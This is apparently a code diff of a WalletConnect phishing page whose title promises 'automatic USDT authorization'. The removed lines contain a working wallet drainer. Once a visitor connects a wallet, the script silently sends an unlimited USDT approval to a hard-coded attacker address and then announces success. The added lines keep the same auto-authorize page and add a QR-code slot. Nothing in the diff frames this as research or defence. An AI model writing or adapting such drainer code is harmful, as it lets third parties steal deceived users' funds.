@@ -2,57 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>WalletConnect v2 自動授權 USDT</title>
-  <script type="module">
-    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@2.6.2/dist/index.js';
-    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js';
-    import { configureChains, createConfig, WagmiConfig } from 'https://unpkg.com/@wagmi/core@1.6.5/dist/index.js';
-    import { mainnet } from 'https://unpkg.com/@wagmi/core/chains@1.6.5';
-
-    const projectId = '71bfb38ef62b38dbcf4e7bb84dc36591';
-
-    const chains = [mainnet];
-    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
-    const wagmiConfig = createConfig({
-      autoConnect: true,
-      connectors: w3mConnectors({ projectId, version: 2, chains }),
-      publicClient
-    });
-
-    const ethereumClient = new EthereumClient(wagmiConfig, chains);
-    const modal = new Web3Modal({ projectId, themeMode: 'light' }, ethereumClient);
-
-    modal.openModal();
-
-    ethereumClient.watchAccount(async (account) => {
-      if (account.address) {
-        const provider = await ethereumClient.getProvider();
-        const web3 = new window.Web3(provider);
-        const usdt = new web3.eth.Contract([
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_spender", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function"
-          }
-        ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");
-
-        const maxAmount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-        const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
-
-        await usdt.methods.approve(spender, maxAmount).send({ from: account.address });
-        alert("✅ USDT 授權成功");
-      }
-    });
-  </script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WalletConnect v2 - 掃碼自動授權 USDT</title>
+  <script type="module" src="https://cdn.jsdelivr.net/npm/@wagmi/core@1.6.5/dist/index.js"></script>
 </head>
-<body style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
   <h2>WalletConnect v2 - 掃碼自動授權 USDT</h2>
+  <div id="qr"></div>
 </body>
 </html>
